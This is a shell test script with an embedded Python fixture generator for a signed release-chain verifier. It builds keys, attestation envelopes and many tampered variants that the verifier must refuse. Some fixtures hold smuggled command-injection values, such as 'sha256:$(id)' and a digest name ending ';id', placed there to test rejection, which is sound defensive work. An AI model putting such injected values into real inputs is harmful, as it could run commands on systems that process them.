#!/usr/bin/env bash
# proves: REQ-CHAIN-001-AC2, REQ-CHAIN-001-AC3, REQ-CHAIN-001-AC4, REQ-CHAIN-002-AC2, REQ-CHAIN-003-AC1, REQ-CHAIN-003-AC2, REQ-CHAIN-003-AC4, REQ-CHAIN-007-AC16, REQ-CHAIN-001-AC6
# proves: REQ-CHAIN-005-AC4 — apk-compare: the comparison job's result file is accepted only as a pass for Build's attested apk digests
#
# Tests for the plain verify script of the v0.3.0 release chain (rules 52, 53, 53b, 57 verify side, 58, 63, 67), after the move to ONE
# KMS-backed release key (handoff 0713, owner's ruling of Oct 28: no keyless signing, no certificate, no timestamp authority; ratify B of Oct 29 keeps Rekor: every signature keeps its Rekor entry).
# Needs: bash, OpenSSL 3 (macOS: brew install openssl@3, found automatically), python3 with PyYAML (apt: python3-yaml).
# Offline: an offline root key, a release key, a throwaway ed25519 key and every record are made at test time with openssl; no key is
# committed. Every verify case runs with the network genuinely cut (macOS sandbox-exec, Linux unshare -rn or sudo unshare -n) and a control
# proves the cut; if no way exists the run says so loudly (CHAIN_TEST_REQUIRE_NETCUT=1 makes that a failure; the CI wiring MUST set it, and on
# ubuntu-24.04 the `sudo -n unshare -n` fallback runs the verifier as root: files it leaves in the work dir are removed by the exit trap with
# sudo). Every refusal case is judged by exit code 1 (0 accepted; anything else, such as a missing script or a Python traceback, is an ERROR and
# fails the case) AND by words the message must contain. The key manifest itself is tested in bin/chain-manifest-test.sh.
#
# What a record is now: a DSSE envelope with exactly one signature {keyid, sig} (keyid optional, a string; Witness 0.12.0 writes the KMS
# reference there and the verifier never looks a key up by it) made by the release key over the DSSE PAE (ECDSA P-256, SHA-256, DER). The
# envelope has no certificate, intermediates or timestamps field: a record that still carries one is an old-form record and is refused.
# A record is bound to its stage by its TYPE and its collection name, never by who signed it (S2: step name, digest chain, and the AWS role's
# trust on the workflow file); the signing key is the same for every stage.
#
# Real formats this models (Modelled on, read-only clones):
#   Witness collection: predicateType https://witness.testifysec.com/attestation-collection/v0.1 inside a Statement
#     _type https://in-toto.io/Statement/v0.1 (in-toto-witness docs/tutorials/artifact-policy.md:60-70). Statement v1 is accepted too.
#   Signed policy (stage release): payloadType https://witness.testifysec.com/policy/v0.1, the payload is the policy JSON, not a Statement.
#   SLSA provenance: https://slsa.dev/provenance/v1, Statement v1 (in-toto-attestation spec/predicates/provenance.md:3). Only v1 is allowed.
#
# THE CLI THIS TEST ASSUMES (the implementer matches it; anything else is a change to this header first):
#   chain-verify.py policy make --template T.json (--tag vX.Y.Z | --ref REF) [--keys-dir D] [--now ISO8601Z] --out POLICY.json
#       T.json {"repository":"owner/repo","stages":["build","sign","rebuild","check","release"]}. The key manifest in D (default: the template's
#       directory) is checked FIRST, with the root key in D (see bin/chain-manifest-test.sh): `refused at manifest: ...` on any failure.
#       POLICY.json {"tag","ref","repository","release_key":{"key_id","public_key"},"stages":[...]} and "dry_run": true for a branch ref.
#       --tag vX.Y.Z[-rcN] and --ref refs/tags/vX.Y.Z[-rcN] make the same policy; a branch ref (the dry run's) makes a dry_run policy;
#       refs/tags/x, refs/pull/N/merge and the snapshot version v0.0.0 exit 1 ("tag" / "snapshot").
#   chain-verify.py verify --policy POLICY.json --stage NAME --record REC.json
#       Checks, any failure exit 1 with the cause on stderr as `refused at <stage>: <reason>`: the envelope (one signature, no certificate
#       field, canonical base64, strict JSON, UTF-8 only: "envelope"), the signature by the policy's release key ("signature"; a record signed
#       by another key, by the building job's throwaway key, or unsigned all end here), the record type bound to the stage ("predicate":
#       Witness collection only for build/rebuild/check, SLSA provenance v1 only for sign, the Witness policy payloadType only for release),
#       for provenance the ref inside it (buildDefinition.externalParameters.ref) equal to the policy's ref ("ref"), and no token in a
#       Witness collection's environment. Provenance whose predicate says dryRun true is refused under a non-dry policy ("dry"). Dry-run
#       policies are accepted for stage sign only.
#   chain-verify.py stage-start --stage NAME --previous PREV --record REC.json --digests D.json --policy POLICY.json
#       STAGE PAIRS (rule 58): rebuild<-build, check<-build, sign<-build, release<-{build, sign, rebuild, check}; any other pair is refused
#       ("stage"). Runs the SAME verification as verify for stage PREV, then compares digests exactly: for a SLSA provenance record the
#       subjects equal D.json's entries; for a Witness collection the product subject file:digests.json has sha256 == the sha256 of D.json's
#       bytes (equal, not subset or superset); exit 1 with PREV and the cause in the message.
#   chain-verify.py sign --check --signer cosign --digests D.json --build-record REC.json (--template T.json | --policy POLICY.json)
#                   [--keys-dir D] [--now ISO8601Z] --out DIR
#       exactly ONE of --template (the committed template; the per-tag policy is made here from GITHUB_REF, which must be refs/tags/vX.Y.Z[-rcN]
#       on a push, or a branch on workflow_dispatch = a dry run) and --policy (a finished policy). Build's record is verified as stage build
#       FIRST, D.json must be the file its product subject attests by sha256 ("digest") and must pass the format check ("format"); only then
#       it writes the unsigned in-toto Statement v1 (SLSA provenance v1) to a temp file and runs EXACTLY
#       `cosign attest-blob --yes --key awskms:///alias/fosterstack-release-signing --signing-config <template dir>/cosign-signing-config.json
#        --statement STATEMENT.json --bundle DIR/provenance.bundle.json` (the signing config names one Rekor, v1, and no certificate authority, sign-in service or timestamp authority; the key
#       is named by its alias, never by an ARN, a token or a file), then writes DIR/provenance.json (the bundle's DSSE envelope) and checks it
#       with `verify` under the same policy before it prints ok; any refusal removes DIR. A bundle that carries a certificate is refused.
#   chain-verify.py check-build-record, bind-items, bind-check, check-list, sign-records, rc-proof, apk-compare, actions, record-env,
#       hostile-*: as before, with --keys-dir in place of the four trust flags where a policy is made, and no --rekor-stub and no --now where a
#       finished policy is given.

set -euo pipefail
# the runner's own GITHUB_REF / GITHUB_EVENT_NAME (refs/pull/N/merge, pull_request ...) must never leak into a case: every case that
# needs them sets both itself (Opus r5 N-b, Sonnet r5 finding 4)
unset GITHUB_REF GITHUB_EVENT_NAME
root=$(cd "$(dirname "$0")/.." && pwd)
cv="$root/bin/chain-verify.py"
work=$(mktemp -d); trap 'rm -rf "$work" 2> /dev/null || sudo -n rm -rf "$work"' EXIT
FXDIR="$work/fx"; mkdir -p "$FXDIR"   # fixture strings that name a download tool are written here by quoted here-documents (pin-age proves them as text)
pass=0 failn=0
ok()   { pass=$((pass + 1)); echo "ok   $1"; }
bad()  { failn=$((failn + 1)); echo "FAIL $1"; }

# ---- tools ------------------------------------------------------------------------------------------------------
OPENSSL=openssl
if ! grep -q '^OpenSSL 3' <<< "$(openssl version 2> /dev/null)"; then
  for c in /opt/homebrew/opt/openssl@3/bin/openssl /usr/local/opt/openssl@3/bin/openssl; do [ -x "$c" ] && OPENSSL=$c && break; done
fi
grep -q '^OpenSSL 3' <<< "$($OPENSSL version 2> /dev/null)" || { echo "FAIL fixtures need OpenSSL 3 (macOS: install openssl@3 with Homebrew)"; exit 1; }
export OPENSSL
python3 -c 'import yaml' 2> /dev/null || { echo "FAIL python3 needs PyYAML (install the python3-yaml package)"; exit 1; }
netcut=()
if [ "$(uname)" = Darwin ] && command -v sandbox-exec > /dev/null; then netcut=(sandbox-exec -p '(version 1)(allow default)(deny network*)')
elif unshare -rn true 2> /dev/null; then netcut=(unshare -rn)
elif sudo -n unshare -n true 2> /dev/null; then netcut=(sudo -n unshare -n)
fi
probe='import socket,sys
try: socket.create_connection(("1.1.1.1", 53), 3); sys.exit(0)
except OSError: sys.exit(1)'
if [ "${#netcut[@]}" -gt 0 ]; then
  if "${netcut[@]}" python3 -c "$probe" 2> /dev/null; then bad "network cut control: a connection got out"; else ok "network cut control: an outbound connection fails inside the cut"; fi
else
  echo "NOTE no way to cut the network here (no sandbox-exec, unshare -rn or sudo unshare -n): verify cases run WITHOUT a cut"
  if [ "${CHAIN_TEST_REQUIRE_NETCUT:-0}" = 1 ]; then bad "network cut required (CHAIN_TEST_REQUIRE_NETCUT=1) but unavailable"; else ok "network cut: unavailable here, noted above (the case count stays constant)"; fi
fi

# ---- fixtures ---------------------------------------------------------------------------------------------------
cat > "$work/fx.py" <<'PY'
import base64, datetime as dt, hashlib, json, os, shutil, subprocess, sys
W = sys.argv[1]
SSL = os.environ["OPENSSL"]
def sh(*a):
    a = (SSL,) + a[1:] if a[0] == "openssl" else a
    r = subprocess.run(a, capture_output=True)
    if r.returncode: sys.stderr.write("%s\n%s\n" % (" ".join(a), r.stderr.decode())); sys.exit(1)
    return r.stdout
def p(n): return os.path.join(W, n)
def b64(b): return base64.b64encode(b).decode()
def gitoid(data, algo): return hashlib.new(algo, b"blob %d\0" % len(data) + data).hexdigest()
def pae(t, b): return b"DSSEv1 %d %s %d %s" % (len(t.encode()), t.encode(), len(b), b)
REPO = "fosterstack/cache"
T, T2, TRC, DRYREF = "refs/tags/v0.3.0", "refs/tags/v0.3.1", "refs/tags/v0.3.0-rc1", "refs/heads/hostile-proof/x"
STMT = {"v0.1": "https://in-toto.io/Statement/v0.1", "v1": "https://in-toto.io/Statement/v1"}
DSSE = "application/vnd.in-toto+json"
PROV_URI = "https://slsa.dev/provenance/v1"
# ---- the keys: the offline root key signs the manifest of the release key; the release key signs every record (handoff 0713 P1) ----
def genkey(name, *opts):
    sh("openssl", "genpkey", *opts, "-out", p(name + ".key"))
    sh("openssl", "pkey", "-in", p(name + ".key"), "-pubout", "-out", p(name + ".pub"))
EC = ("-algorithm", "EC", "-pkeyopt", "ec_paramgen_curve:P-256")
for _k in ("root", "otherroot", "rel", "other"): genkey(_k, *EC)      # root / otherroot sign manifests, rel is the release key, other is a key the manifest does not name
genkey("rekor", *EC)                                                   # the Rekor log's key for this run (ratify B); rekor.pub sits next to template.json with its sigstore-trust.json pin
def der_sha_early(name): return hashlib.sha256(sh("openssl", "pkey", "-pubin", "-in", p(name + ".pub"), "-outform", "DER")).hexdigest()
json.dump({"_note": "throwaway trust file for this test run", "rekor_sha256": der_sha_early("rekor")}, open(p("sigstore-trust.json"), "w"))
def rekor_entry(payload, sig, keyname="rel", index="7"):
    """A Rekor v1 dsse entry for this payload and signature, whose verifier is the public key of `keyname`, signed by this run's Rekor key."""
    body = {"apiVersion": "0.0.1", "kind": "dsse", "spec": {"envelopeHash": {"algorithm": "sha256", "value": "0" * 64},
            "payloadHash": {"algorithm": "sha256", "value": hashlib.sha256(payload).hexdigest()},
            "signatures": [{"signature": b64(sig), "verifier": b64(open(p(keyname + ".pub")).read().encode())}]}}
    cb = b64(json.dumps(body, sort_keys=True, separators=(",", ":")).encode())
    log_id = der_sha_early("rekor")
    canon = json.dumps({"body": cb, "integratedTime": 1761800000, "logID": log_id, "logIndex": int(index)}, sort_keys=True, separators=(",", ":")).encode()
    set_sig = sh("openssl", "dgst", "-sha256", "-sign", p("rekor.key"), p("rekor.set.in")) if open(p("rekor.set.in"), "wb").write(canon) else b""
    return {"logIndex": index, "integratedTime": "1761800000", "logId": {"keyId": b64(bytes.fromhex(log_id))}, "kindVersion": {"kind": "dsse", "version": "0.0.1"},
            "canonicalizedBody": cb, "inclusionPromise": {"signedEntryTimestamp": b64(set_sig)}}
genkey("throwaway", "-algorithm", "ED25519")                           # the building job's own key (Witness 0.12.0 with a file key): its records are refused
def der_sha(name): return hashlib.sha256(sh("openssl", "pkey", "-pubin", "-in", p(name + ".pub"), "-outform", "DER")).hexdigest()
def sign_file(key, path):
    if key == "throwaway": return sh("openssl", "pkeyutl", "-sign", "-rawin", "-inkey", p("throwaway.key"), "-in", path)
    return sh("openssl", "dgst", "-sha256", "-sign", p(key + ".key"), path)
MANIFEST = {"public_key": open(p("rel.pub")).read(), "key_id": der_sha("rel"), "valid_from": "2020-01-01T00:00:00Z"}
open(p("release-key-root.pub"), "w").write(open(p("root.pub")).read())
open(p("release-key-manifest.json"), "wb").write(json.dumps(MANIFEST, sort_keys=True, indent=1).encode() + b"\n")
open(p("release-key-manifest.sig"), "w").write(b64(sign_file("root", p("release-key-manifest.json"))) + "\n")
# the same keys directory with a manifest signed by another root (a policy that must refuse every record of the real chain)
os.makedirs(p("keys-otherroot"), exist_ok=True)
for _f in ("release-key-root.pub", "release-key-manifest.json"): shutil.copy(p(_f), p("keys-otherroot/" + _f))
open(p("keys-otherroot/release-key-manifest.sig"), "w").write(b64(sign_file("otherroot", p("release-key-manifest.json"))) + "\n")
KEYID = "awskms:///alias/fosterstack-release-signing"      # what Witness 0.12.0 writes as the keyid of a KMS signature (go-witness signer/kms/aws/signer.go)
STAGE_LIST = ["build", "sign", "rebuild", "check", "release"]
json.dump({"repository": REPO, "stages": STAGE_LIST}, open(p("template.json"), "w"))
# A minimal VALID SLSA v1 provenance predicate (Codex #249 r4 B4): every provenance fixture carries it, so a record is refused only for
# what its case names; a case's own predicate fields are laid over it, and raw_predicate=True signs the predicate exactly as given.
def slsa_ok(ref):
    site = "https://github.com/fosterstack/cache"
    return {"buildDefinition": {"buildType": site + "/release-chain/v0.3.0",
                                "externalParameters": {"ref": ref, "workflow": site + "/.github/workflows/release.yml@" + ref},
                                "internalParameters": {}, "resolvedDependencies": [{"uri": "git+" + site + "@" + ref, "digest": {"gitCommit": "f" * 40}}]},
            "runDetails": {"builder": {"id": site + "/.github/workflows/stage-sign.yml@" + ref},
                           "metadata": {"invocationId": site + "/actions/runs/1"}}}
SLSA_OK = slsa_ok(T)
def prov_predicate(ptype, predicate, raw=False, ref=T):
    if raw: return predicate                                   # exactly as given, null included
    if ptype != PROV_URI: return predicate if predicate is not None else {}
    return dict(slsa_ok(ref), **(predicate or {}))
# A Witness collection is named for the step that made it, and the verifier refuses a name that is not a release name of the stage that reads it
# (REQ-CHAIN-004-AC13, closed names: build/apk for Build, rebuild/rapk for Rebuild). Every fixture is named for its stage; the Check fixtures keep
# build, the one name that tests the refusals of a record presented to the wrong stage (the name check does not apply to the Check stage).
def record(name, ptype, subjects, key="rel", signed=True, stmt="v1", dsse=DSSE, payload=None, coll_file=None, coll_variant=None, coll_name=None,
           predicate=None, raw_predicate=False, ref=T):
    """A DSSE envelope with one signature by `key` over the PAE and no certificate, intermediates or timestamps: the form Witness and cosign write for a KMS key."""
    if payload is None and coll_file:
        # REAL Witness collection shape (in-toto-witness docs/tutorials/artifact-policy.md:58-70): the product attestor names the
        # file `https://witness.dev/attestations/product/v0.1/file:<name>` with sha256 + gitoid:sha1 + gitoid:sha256 digests, the git
        # attestor adds the commit; the predicate lists the attestations that ran (environment, git, product, command-run)
        data = open(p(coll_file), "rb").read()
        subj = [{"name": "https://witness.dev/attestations/product/v0.1/file:digests.json",
                 "digest": {"sha256": hashlib.sha256(data).hexdigest(), "gitoid:sha1": "gitoid:blob:sha1:" + gitoid(data, "sha1"),
                            "gitoid:sha256": "gitoid:blob:sha256:" + gitoid(data, "sha256")}},
                {"name": "https://witness.dev/attestations/git/v0.1/commithash:" + "f" * 40, "digest": {"gitoid:sha1": "gitoid:commit:sha1:" + "f" * 40}}]
        if coll_variant:
            # S3: the subject must be bound BY NAME. wrongname: file:digests.json carries the wrong hash while another product
            # subject (file:other) carries the right one; dup / dup2: two subjects both named file:digests.json, one right, one wrong
            wrong = dict(subj[0], digest={"sha256": "e" * 64, "gitoid:sha1": "gitoid:blob:sha1:" + "0" * 40, "gitoid:sha256": "gitoid:blob:sha256:" + "0" * 64})
            other = dict(subj[0], name="https://witness.dev/attestations/product/v0.1/file:other")
            def nm(n): return dict(subj[0], name=n)
            P = "https://witness.dev/attestations/"
            subj = {"wrongname": [wrong, other, subj[1]], "dup": [wrong, subj[0], subj[1]], "dup2": [subj[0], wrong, subj[1]],
                    # decoys that carry the RIGHT hash under a near-miss name while the real file:digests.json is wrong: a substring,
                    # suffix or prefix match on the name would accept them
                    "bak": [wrong, nm(P + "product/v0.1/file:digests.json.bak"), subj[1]], "xname": [wrong, nm(P + "product/v0.1/file:xdigests.json"), subj[1]],
                    "evilhost": [wrong, nm("https://evil.example/attestations/product/v0.1/file:digests.json"), subj[1]],
                    "material": [wrong, nm(P + "material/v0.1/file:digests.json"), subj[1]],
                    # the right file name but its digest set has only a gitoid, no sha256 key
                    "gitoidonly": [dict(subj[0], digest={k: v for k, v in subj[0]["digest"].items() if k != "sha256"}), subj[1]]}[coll_variant]
        att = [{"type": "https://witness.dev/attestations/%s/v0.1" % k, "attestation": {}} for k in ("environment", "git", "product", "command-run")]
        payload = json.dumps({"_type": STMT[stmt], "predicateType": ptype, "predicate": {"name": coll_name or "build", "attestations": att}, "subject": subj}).encode()
    if payload is None:
        payload = json.dumps({"_type": STMT[stmt], "predicateType": ptype, "predicate": prov_predicate(ptype, predicate, raw_predicate, ref),
                              "subject": [{"name": k, "digest": {"sha256": v.split(":", 1)[1] if v.startswith("sha256:") else v}} for k, v in subjects.items()]}).encode()
    open(p("pae.bin"), "wb").write(pae(dsse, payload))
    sig = sign_file(key, p("pae.bin"))
    env = {"payloadType": dsse, "payload": b64(payload), "signatures": [{"keyid": KEYID, "sig": b64(sig)}] if signed else []}
    json.dump(env, open(p(name + ".json"), "w"))
    if signed and (ptype == PROV_URI or dsse == "https://witness.testifysec.com/policy/v0.1"):      # a provenance and the release policy carry a Rekor entry beside them
        json.dump({"entries": [rekor_entry(payload, sig, key if key in ("rel", "other") else "rel")]}, open(p(name + ".rekor.json"), "w"))
    return hashlib.sha256(payload).hexdigest()
PAY = {}
def add(n, *a, **k): PAY[n] = record(n, *a, **k)

PROV = "https://slsa.dev/provenance/v1"
COLL = "https://witness.testifysec.com/attestation-collection/v0.1"
POLT = "https://witness.testifysec.com/policy/v0.1"
D = {"image-production": "sha256:" + "a" * 64, "image-fips": "sha256:" + "b" * 64, "apk": "sha256:" + "c" * 64}
def dj(name, d): json.dump(d, open(p(name), "w"))
dj("digests.json", D)
dj("digests-other.json", dict(D, apk="sha256:" + "d" * 64))
dj("digests-extra.json", dict(D, extra="sha256:" + "e" * 64))
dj("digests-subset.json", {k: v for k, v in D.items() if k != "apk"})
# differs-from-the-record files (the record attests D's file; these are other bytes, so the SHA-256 differs: cause "digest")
dj("digests-swapped.json", dict(D, **{"image-production": D["image-fips"], "image-fips": D["image-production"]}))
# FORMAT files: each is attested by its OWN collection (below), so the file hash AGREES with the record and only the content
# can be refused (cause "format"). The mutation each one catches is a validator that is looser than the stated format.
FMT = {"foobar": {"foo": "bar"}, "sha512": dict(D, apk="sha512:" + "c" * 128), "63": dict(D, apk="sha256:" + "c" * 63), "upper": dict(D, apk="sha256:" + "C" * 64),
       "null": dict(D, apk=None), "number": dict(D, apk=7), "path": dict(D, apk="./dist/run.sh"), "code": dict(D, apk="sha256:$(id)"),
       "badval": dict(D, apk="sha256:./dist/run.sh"), "codename": {"image-production;id": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "uppername": {"Image-Production": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "slashname": {"dist/image-production": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "dotdotname": {"..": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       # anchors: a validator that is looser at either end than ^sha256:[0-9a-f]{64}$ and ^[a-z0-9-]+$ must fail one of these
       "hex65": dict(D, apk="sha256:" + "c" * 65), "newline": dict(D, apk="sha256:" + "c" * 64 + "\n"),
       "prefixed": dict(D, apk="./dist/sha256:" + "c" * 64), "emptyname": {"": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "underscorename": {"_": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]}, "emptyobj": {},
       # Python's ^[a-z0-9-]+$ accepts a trailing newline, \d and \w accept Arabic-Indic digits and accented letters
       "newlinename": {"image-production\n": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "unicodename": {"imag\u00e9-production": D["image-production"], "image-fips": D["image-fips"], "apk": D["apk"]},
       "unicodehex": dict(D, apk="sha256:" + "\u0663" * 64), "fullwidthhex": dict(D, apk="sha256:" + "\uff41" * 64)}
for k, v in FMT.items(): dj("digests-%s.json" % k, v)
open(p("digests-dupkey.json"), "w").write('{"image-production":"sha256:%s","image-fips":"sha256:%s","apk":"sha256:%s","apk":"sha256:%s"}' % ("a" * 64, "b" * 64, "d" * 64, "c" * 64))
open(p("digests-notobject.json"), "w").write('["sha256:%s"]' % ("a" * 64))
FMT["dupkey"] = FMT["notobject"] = None

# ---- Sign's provenance and its variants (001-AC4, 002-AC2). The record carries no workflow identity: the key signs it, the type binds it to Sign's stage,
# and the ref inside the provenance (the whole ref, never its last segment) must be the policy's ref.
add("sign_prov", PROV, D)
add("sign_prov_v0.2", "https://slsa.dev/provenance/v0.2", D)
for s in ("build", "rebuild", "check", "release"): add(s + "_as_sign", PROV, D)
add("sign_rc", PROV, D, ref=TRC)
add("sign_othertag", PROV, D, ref=T2)
add("sign_branch", PROV, D, ref="refs/heads/main")
add("sign_br", PROV, D, ref=DRYREF, predicate={"dryRun": True})            # what a dry run's Sign writes (ref = the branch, dryRun true)
add("sign_flag_tag", PROV, D, predicate={"dryRun": True})                # dryRun true even though the ref IS the tag: Release must still refuse
# branches NAMED like the tag (round 5 Opus B2a): a "last path segment" ref comparison accepts these
add("sign_brtag", PROV, D, ref="refs/heads/v0.3.0")
_cfg = slsa_ok(T)       # Q2b: the run's ref is the tag, the calling workflow's ref is the branch named like the tag
_cfg["buildDefinition"]["externalParameters"]["workflow"] = "https://github.com/fosterstack/cache/.github/workflows/release.yml@refs/heads/v0.3.0"
add("sign_cfg_brtag", PROV, D, predicate=_cfg, raw_predicate=True)
_nowf = slsa_ok(T); del _nowf["buildDefinition"]["externalParameters"]["workflow"]
add("sign_nowf", PROV, D, predicate=_nowf, raw_predicate=True)
_noref = slsa_ok(T); del _noref["buildDefinition"]["externalParameters"]["ref"]
add("sign_noref", PROV, D, predicate=_noref, raw_predicate=True)
add("sign_brrel", PROV, D, ref="refs/heads/release/v0.3.0")
add("sign_otherdigests", PROV, dict(D, apk="sha256:" + "d" * 64))
add("sign_coll", COLL, D, stmt="v0.1")
# the key: a record is accepted only when the manifest's key signed it
add("sign_otherkey", PROV, D, key="other")
add("sign_throwaway", PROV, D, key="throwaway")
add("sign_unsigned", PROV, D, signed=False)
_g = json.load(open(p("sign_prov.json")))
def variant(name, edit):
    t = json.loads(json.dumps(_g)); edit(t); json.dump(t, open(p(name + ".json"), "w"))
def _payload(t):
    st = json.loads(base64.b64decode(t["payload"])); st["subject"][0]["digest"]["sha256"] = "e" * 64; t["payload"] = b64(json.dumps(st).encode())
def _sig(t):
    sg = bytearray(base64.b64decode(t["signatures"][0]["sig"])); sg[-1] ^= 1; t["signatures"][0]["sig"] = b64(bytes(sg))
variant("sign_tamper_payload", _payload); variant("sign_tamper_sig", _sig)
# old-form envelopes: a certificate, intermediates or timestamps field is refused, so an old record can never be read as a new one
def _with(field, value): return lambda t: t["signatures"][0].__setitem__(field, value)
variant("sign_old_cert", _with("certificate", b64(b"-----BEGIN CERTIFICATE-----\nAA==\n-----END CERTIFICATE-----\n")))
variant("sign_old_inter", _with("intermediates", []))
variant("sign_old_stamps", _with("timestamps", [{"type": "tsp", "data": "AA=="}]))
variant("sign_keyid_num", _with("keyid", 5))
variant("sign_extra_field", _with("note", "x"))
# ---- Witness collections (real type, Statement v0.1 as Witness writes it; one in v1 form) and the signed policy
add("build_coll", COLL, None, stmt="v0.1", coll_file="digests.json")
# step-8 round 1 (Opus N-1, N-5, Sonnet SF3): a record with a repeated JSON key, one with two signatures, and a collection whose subject list holds things that are not subjects
_t = open(p("sign_prov.json")).read(); open(p("sign_dupkey.json"), "w").write(_t.replace('"payloadType"', '"payloadType": "x", "payloadType"', 1))
_j = json.load(open(p("sign_prov.json"))); _j["signatures"] = _j["signatures"] * 2; json.dump(_j, open(p("sign_2sig.json"), "w"))
add("build_badsubj", COLL, None, stmt="v0.1", payload=json.dumps({"_type": STMT["v0.1"], "predicateType": COLL, "predicate": {"name": "build"}, "subject": ["x", 5]}).encode())
add("build_coll_v1", COLL, None, stmt="v1", coll_file="digests.json")
add("build_coll_plus", COLL, None, stmt="v0.1", coll_file="digests-extra.json")
for v in ("wrongname", "dup", "dup2", "bak", "xname", "evilhost", "material", "gitoidonly"): add("build_coll_" + v, COLL, None, stmt="v0.1", coll_file="digests.json", coll_variant=v)
add("build_coll_swapped", COLL, None, stmt="v0.1", coll_file="digests-swapped.json")
for k in FMT: add("build_coll_" + k, COLL, None, stmt="v0.1", coll_file="digests-%s.json" % k)
add("check_coll", COLL, None, stmt="v0.1", coll_file="digests.json", coll_name="scanners")
add("rebuild_coll", COLL, None, stmt="v0.1", coll_file="digests.json", coll_name="rebuild")
add("rebuild_coll_other", COLL, None, stmt="v0.1", coll_file="digests-other.json", coll_name="rebuild")
# the key binds a Witness collection too: signed by another key, by the building job's throwaway key, and unsigned
for _s, _name in (("build", "build"), ("rebuild", "rebuild"), ("check", "scanners")):
    add(_s + "_coll_otherkey", COLL, None, stmt="v0.1", coll_file="digests.json", coll_name=_name, key="other")
    add(_s + "_coll_throwaway", COLL, None, stmt="v0.1", coll_file="digests.json", coll_name=_name, key="throwaway")
_c = json.load(open(p("build_coll.json")))
t = json.loads(json.dumps(_c)); st = json.loads(base64.b64decode(t["payload"])); st["subject"][0]["digest"]["sha256"] = "e" * 64
t["payload"] = b64(json.dumps(st).encode()); json.dump(t, open(p("build_coll_tampered.json"), "w"))
t = json.loads(json.dumps(_c)); t["signatures"] = []; json.dump(t, open(p("build_coll_unsigned.json"), "w"))
for n, ty in (("build_madeup", "https://example.com/made-up/v1"), ("build_ours", "https://fosterstack.com/attestations/build/v1"),
              ("build_ours_style", "https://fosterstack.com/attestation-collection/v0.1"),
              ("build_v02", "https://witness.testifysec.com/attestation-collection/v0.2"),
              ("build_plural", "https://witness.testifysec.com/attestation-collections/v0.1"),
              ("build_oldhost", "https://witness.dev/attestation-collections/v0.1"),
              ("build_slash", COLL + "/"), ("build_upper", COLL.replace("collection", "Collection")),
              ("build_prefix", COLL + "-extra"), ("build_slsa_slash", PROV + "/")):
    add(n, ty, None, stmt="v0.1", coll_file="digests.json")
polbody = json.dumps({"expires": "2031-01-01T00:00:00Z", "steps": {}}).encode()
add("release_policy", None, None, dsse=POLT, payload=polbody)
add("build_policy", None, None, dsse=POLT, payload=polbody)
# illustrative: https://in-toto.io/attestation/release/v0.1 is the in-toto *registry release* predicate (in-toto-attestation
# spec/predicates/release.md:74), used here only as a NEGATIVE fixture: it is not the signed policy and must be refused
add("release_stmt_policy", "https://in-toto.io/attestation/release/v0.1", D)
# UTF-16 spellings of the same JSON (json.loads on bytes would guess the encoding from the first bytes)
for src in ("build_coll", "sign_prov"):
    open(p(src + "_u16.json"), "wb").write(open(p(src + ".json"), "rb").read().decode().encode("utf-16"))
open(p("digests-u16.json"), "wb").write(open(p("digests.json"), "rb").read().decode().encode("utf-16"))
# step-8 round 4 (S-2): base64 is standard base64 and nothing else. Junk inside a field, and the URL-safe alphabet, are refused, not dropped/accepted.
def mutate_field(src, name, fn):
    r = json.load(open(p(src + ".json"))); fn(r); json.dump(r, open(p(name + ".json"), "w"))
def ins(s, ch, at=6): return s[:at] + ch + s[at:]
mutate_field("sign_prov", "sign_prov_junkpay", lambda r: r.__setitem__("payload", ins(r["payload"], "!!-_ \n")))
mutate_field("sign_prov", "sign_prov_junksig", lambda r: r["signatures"][0].__setitem__("sig", ins(r["signatures"][0]["sig"], "*", 4)))
def urlsafe(s): return s.replace("+", "-").replace("/", "_")
for _try in range(80):
    add("sign_urlsrc", PROV, D, predicate={"pad": "x" * _try})
    if any(c in json.load(open(p("sign_urlsrc.json")))["signatures"][0]["sig"] for c in "+/"): break
else: raise SystemExit("no fixture with + or / in its signature: regenerate")
mutate_field("sign_urlsrc", "sign_us_sig", lambda r: r["signatures"][0].__setitem__("sig", urlsafe(r["signatures"][0]["sig"])))
# one byte string, one spelling: a non-canonical base64 (unused padding bits set, YR== for YQ==) is refused in every field
A64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
def noncanon(s):
    """The same bytes spelled another way: set an unused padding bit of the last data character (YQ== -> YR==)."""
    body = s.rstrip("="); pad = len(s) - len(body); assert pad, "no padding: no second spelling exists"
    out = body[:-1] + A64[A64.index(body[-1]) | 1] + "=" * pad
    assert out != s and base64.b64decode(out) == base64.b64decode(s), s
    return out
for _try in range(60):
    add("sign_pad", PROV, D, predicate={"pad": "x" * (_try % 3)})
    _r = json.load(open(p("sign_pad.json"))); _e = _r["signatures"][0]
    if all(x.endswith("=") for x in (_r["payload"], _e["sig"])): break
else: raise SystemExit("no sign_pad fixture with padding in every field after 60 tries: regenerate")
mutate_field("sign_pad", "sign_nc_payload", lambda r: r.__setitem__("payload", noncanon(r["payload"])))
mutate_field("sign_pad", "sign_nc_sig", lambda r: r["signatures"][0].__setitem__("sig", noncanon(r["signatures"][0]["sig"])))
add("sign_nan", PROV, D, predicate={"x": float("nan")})       # json.dumps writes NaN: a signed payload that is not JSON
open(p("sign_envinf.json"), "w").write(open(p("sign_prov.json")).read().replace('"payloadType"', '"x": Infinity, "payloadType"', 1))
variant("sign_prov_keyid_other", _with("keyid", "awskms:///arn:aws:kms:us-east-1:111122223333:key/other"))
shutil.copy(p("sign_prov.rekor.json"), p("sign_prov_keyid_other.rekor.json"))      # only the keyid differs, so the same signature and the same Rekor entry
# a keys directory whose manifest names the OTHER key (signed by the real root): a policy made from it must refuse records of the real release key
os.makedirs(p("keys-other"), exist_ok=True)
shutil.copy(p("release-key-root.pub"), p("keys-other/release-key-root.pub"))
open(p("keys-other/release-key-manifest.json"), "wb").write(json.dumps({"public_key": open(p("other.pub")).read(), "key_id": der_sha("other"),
                                                                      "valid_from": "2020-01-01T00:00:00Z"}, sort_keys=True, indent=1).encode() + b"\n")
open(p("keys-other/release-key-manifest.sig"), "w").write(b64(sign_file("root", p("keys-other/release-key-manifest.json"))) + "\n")

